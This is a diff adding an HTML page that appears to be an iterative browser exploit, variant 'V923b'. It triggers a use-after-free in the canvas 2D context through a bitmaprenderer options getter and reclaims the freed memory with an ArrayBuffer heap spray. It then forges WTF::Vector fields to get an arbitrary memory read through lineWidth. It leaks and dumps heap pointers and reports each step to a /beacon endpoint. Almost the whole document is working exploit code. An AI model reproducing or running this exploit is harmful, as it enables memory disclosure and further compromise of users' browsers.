@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V923b - roundRect leak (Vector order verified: cap@+120 size@+124)</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; line-height:1.55; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  code { color:#c9d1d9; background:#21262d; padding:1px 5px; border-radius:4px; }
+  .key { border-left:3px solid #3fb950; padding-left:8px; }
+</style>
+</head>
+<body>
+<h1>V923b - V923 clone with verified Vector field order (safe to A/B test)</h1>
+
+<p class="key">
+<b>Separate verification copy of V923.</b> Same roundRect heap-pointer leak flow, but the
+<code>m_stateStack</code> forge uses the <b>verified WTF::Vector order</b>:
+<code>+112 m_buffer</code>, <code>+120 m_capacity</code>, <code>+124 m_size</code>.
+V923 wrote <code>k=1</code> to both words (so behavior was identical); V923b keeps that
+intent explicit (<code>capacity=1, size=1</code>) and logs it. Use this to A/B against V923
+without touching the original. State/lineWidth offsets remain the device-verified
+<code>400B / +48</code> model.
+</p>
+
+<pre id="out">starting...</pre>
+
+<script>
+'use strict';
+
+var SEEK = location.pathname;
+var RUN = 'r' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 7);
+
+function lsGet(k) { try { return window.localStorage.getItem('v923b_' + k); } catch (e) { return null; } }
+function lsSet(k, v) { try { window.localStorage.setItem('v923b_' + k, String(v)); } catch (e) {} }
+function lsDel(k) { try { window.localStorage.removeItem('v923b_' + k); } catch (e) {} }
+
+function bks(tag, body) {
+  var u = '/beacon/V923B-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 460)) +
+          '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch (e) { try { var i = new Image(); i.src = u; } catch (e2) {} }
+}
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+
+var F64 = new Float64Array(1), U32 = new Uint32Array(F64.buffer);
+function hexOf(x) { F64[0] = x; return '0x' + ('00000000' + U32[1].toString(16)).slice(-8) + ('00000000' + U32[0].toString(16)).slice(-8); }
+function hexAddr(a) { return (isFinite(a) && a >= 0) ? '0x' + Math.floor(a).toString(16) : 'nan'; }
+function errOf(e) { return e ? String(e.name || 'Error') + ':' + String(e.message || '').slice(0, 60) : 'none'; }
+
+var VIEWS = null, KEEP = null, CTX = null, HASRR = false;
+var WORDS = 192;                 /* 768 / 4 */
+var CANARY_WORD = 148;           /* context+592 m_unrealizedSaveCount */
+var PATH_WORD = 12;              /* context+48 Path.m_path (cairo_t*) */
+
+/* ---------- UAF trigger (same shape as V923) ---------- */
+function trigger(canvas, nsaves) {
+  var saved = null, hasRR = false;
+  var dict = {};
+  Object.defineProperty(dict, 'alpha', {
+    get: function () {
+      var ctx = canvas.getContext('2d');
+      if (!ctx) return true;
+      saved = ctx;
+      try { hasRR = (typeof ctx.roundRect === 'function'); } catch (e0) {}
+      try {
+        ctx.lineWidth = 3.14159;
+        ctx.miterLimit = 7.77;
+        ctx.globalAlpha = 0.42;
+        ctx.lineDashOffset = 2.222;
+        ctx.shadowBlur = 5.55;
+        for (var s = 0; s < nsaves; s++) ctx.save();
+        ctx.lineWidth = 1.0;
+      } catch (e) {}
+      return true;
+    }
+  });
+  var bmp = null;
+  try { bmp = canvas.getContext('bitmaprenderer', dict); } catch (e2) {}
+  return { saved: saved, bmp: bmp, hasRR: hasRR };
+}
+
+/* ---------- zeroed ArrayBuffer spray (bmalloc 768) ---------- */
+function spray(count) {
+  var abs = new Array(count), views = new Array(count);
+  for (var i = 0; i < count; i++) {
+    var ab = new ArrayBuffer(768);
+    views[i] = new Uint32Array(ab);
+    abs[i] = ab;
+  }
+  KEEP = abs;
+  VIEWS = views;
+}
+
+/* ---------- scans ---------- */
+function scanAll(maxHits) {
+  var hits = [];
+  for (var i = 0; i < VIEWS.length; i++) {
+    var v = VIEWS[i];
+    for (var w = 0; w < WORDS; w++) {
+      if (v[w] !== 0) {
+        hits.push([i, w, v[w]]);
+        if (hits.length >= maxHits) return hits;
+      }
+    }
+  }
+  return hits;
+}
+function scanView(i, maxHits) {
+  var hits = [], v = VIEWS[i];
+  for (var w = 0; w < WORDS; w++) {
+    if (v[w] !== 0) {
+      hits.push([w, v[w]]);
+      if (hits.length >= maxHits) return hits;
+    }
+  }
+  return hits;
+}
+function hitStr(hits) {
+  var a = [];
+  for (var i = 0; i < hits.length; i++) {
+    if (hits[i].length === 3) a.push('v' + hits[i][0] + '/w' + hits[i][1] + '=0x' + hits[i][2].toString(16));
+    else a.push('w' + hits[i][0] + '=0x' + hits[i][1].toString(16));
+  }
+  return a.join(',');
+}
+
+/* ---------- forge / read through the stale wrapper ----------
+ * Verified Vector layout (WTF::Vector / VectorBufferBase):
+ *   +112 m_buffer   (ptr)
+ *   +120 m_capacity (u32)
+ *   +124 m_size     (u32)
+ * lineWidth read primitive: returns *(m_buffer + 48), so rd(T) => m_buffer = T-48, size=1.
+ */
+function forge(addr, capacity, size) {
+  var lo = addr % 0x100000000;
+  var hi = Math.floor(addr / 0x100000000);
+  for (var i = 0; i < VIEWS.length; i++) {
+    var v = VIEWS[i];
+    v[28] = lo;         /* +112 m_buffer lo */
+    v[29] = hi;         /* +116 m_buffer hi */
+    v[30] = capacity;   /* +120 m_capacity  */
+    v[31] = size;       /* +124 m_size      */
+  }
+}
+function rd(addr) {
+  forge(addr - 48, 1, 1); /* capacity=1, size=1 */
+  lsSet('pending', hexAddr(addr));
+  var v = CTX.lineWidth;
+  lsDel('pending');
+  return v;
+}
+
+function reloadSoon(ms) { setTimeout(function () { location.href = SEEK + '?op=auto&r=' + Date.now(); }, ms); }
+
+/* ---------- main ---------- */
+function main() {
+  var q = location.search;
+
+  if (q.indexOf('reset=1') >= 0) {
+    lsDel('pending'); lsDel('loads'); lsDel('phase'); lsDel('slot');
+    bks('RESET', 'cleared');
+    say('cleared. reopen ?op=auto');
+    return;
+  }
+
+  var loads = parseInt(lsGet('loads') || '0', 10) + 1;
+  lsSet('loads', loads);
+  if (loads > 80) {
+    bks('GIVEUP', 'loads=' + loads);
+    say('too many loads - reopen with ?reset=1');
+    return;
+  }
+
+  var pend = lsGet('pending');
+  if (pend) {
+    lsDel('pending');
+    bks('CRASH', 'addr=' + pend + ',load=' + loads);
+    say('previous load died while reading ' + pend + ' (process restarted, heap lost)');
+  }
+
+  bks('BOOT', 'load=' + loads + ',ua=' + navigator.userAgent.slice(0, 56));
+
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  document.body.appendChild(canvas);
+  window._v923bcanvas = canvas;
+
+  var t = trigger(canvas, 32);
+  if (!t.saved) { bks('ERR', 'trigger-failed'); say('trigger failed - reloading'); reloadSoon(1500); return; }
+  CTX = t.saved;
+  HASRR = t.hasRR;
+  bks('PREFLIGHT', 'roundRect=' + HASRR + ',vecOrder=cap@120,sz@124');
+  if (!HASRR) { bks('NORR', 'roundRect missing'); say('roundRect is not exposed - stop'); return; }
+
+  spray(400);
+  bks('ARM', 'abs=400');
+  say('UAF armed, 400 zeroed ABs sprayed (Vector order verified: cap@+120, size@+124)');
+
+  /* ---------- 1) safe canary: save() writes ++m_unrealizedSaveCount ---------- */
+  try { CTX.save(); }
+  catch (e) { bks('SAVEERR', errOf(e)); say('save threw - reloading'); reloadSoon(1200); return; }
+
+  var ch = scanAll(8);
+  bks('CANARY', 'n=' + ch.length + ',' + hitStr(ch));
+  say('canary hits=' + ch.length + ' ' + hitStr(ch));
+
+  if (ch.length === 0) {
+    bks('NOSLOT', 'no AB aliases the freed slot');
+    say('no AB owns the slot - reloading');
+    reloadSoon(1200);
+    return;
+  }
+
+  var slot = -1, cw = -1, cv = 0, i;
+  for (i = 0; i < ch.length; i++) {
+    if (ch[i][1] === CANARY_WORD) { slot = ch[i][0]; cw = CANARY_WORD; cv = ch[i][2]; break; }
+  }
+  if (slot < 0) { slot = ch[0][0]; cw = ch[0][1]; cv = ch[0][2]; }
+  lsSet('slot', slot);
+  bks('SLOT', 'v=' + slot + ',word=' + cw + ',val=0x' + cv.toString(16));
+  say('slot is AB view ' + slot + ' (canary word ' + cw + ' = 0x' + cv.toString(16) + ')');
+
+  /* ---------- 2) roundRect: gate-free, first moveTo allocates cairo_t ---------- */
+  lsSet('pending', 'roundRect');
+  bks('RR', 'v=' + slot);
+  try { CTX.roundRect(10, 10, 100, 100, 5); }
+  catch (e) {
+    lsDel('pending');
+    bks('RRERR', errOf(e));
+    say('roundRect threw: ' + errOf(e) + ' - reloading');
+    reloadSoon(1200);
+    return;
+  }
+  lsDel('pending');
+
+  var af = scanView(slot, 48);
+  bks('AFTER', 'v=' + slot + ',n=' + af.length + ',' + hitStr(af));
+  say('after roundRect: ' + hitStr(af));
+
+  /* ---------- 3) extract an 8-byte pointer qword (skip the canary qword) ---------- */
+  var v = VIEWS[slot];
+  var canaryQ = Math.floor(cw / 2);
+  var P = -1, pw = -1, cands = '';
+  for (var w = 0; w + 1 < WORDS; w += 2) {
+    if (w / 2 === canaryQ) continue;
+    var lo = v[w], hi = v[w + 1];
+    if (lo === 0 && hi === 0) continue;
+    var val = hi * 0x100000000 + lo;
+    cands += 'q' + (w / 2) + '=' + hexAddr(val) + ' ';
+    if (P < 0 && val > 0x10000 && val < 0x1000000000000) { P = val; pw = w; }
+  }
+
+  if (P < 0) {
+    bks('NOWRITE', 'v=' + slot + ',af=' + hitStr(af) + ',q=' + cands.slice(0, 200));
+    say('no pointer written by roundRect');
+    return;
+  }
+  lsSet('phase', 'leak');
+  bks('LEAK', 'v=' + slot + ',w=' + pw + ',P=' + hexAddr(P) + ',q=' + cands.slice(0, 180));
+  say('LEAK P=' + hexAddr(P) + ' (word ' + pw + ')');
+
+  var cls = (P >= 0x800000000 && P < 0x900000000) ? 'wk-window' :
+            (P >= 0x7ff000000000 && P < 0x800000000000) ? 'stack' :
+            (P >= 0x100000000) ? 'heap>4G' : 'heap<4G';
+  bks('CLASS', cls);
+  say('class ' + cls);
+
+  /* ---------- 4) dump the first 12 qwords at P ---------- */
+  var dump = [], k;
+  for (k = 0; k < 12; k++) {
+    var a = P + k * 8;
+    bks('RDPRE', 'k=' + k + ',a=' + hexAddr(a));
+    var qv;
+    try { qv = rd(a); }
+    catch (e) { bks('RDERR', 'k=' + k + ',' + errOf(e)); break; }
+    var hx = hexOf(qv);
+    dump.push(k + ':' + hx);
+    bks('RD', 'k=' + k + ',' + hx);
+    say('[' + k + '] ' + hx);
+  }
+  bks('DUMP', dump.join(' '));
+  lsSet('phase', 'done');
+  say('done - see beacons');
+}
+
+try { main(); }
+catch (e) { bks('FATAL', String(e && (e.message || e)).slice(0, 200)); say('FATAL ' + e); }
+</script>
+</body>
+</html>
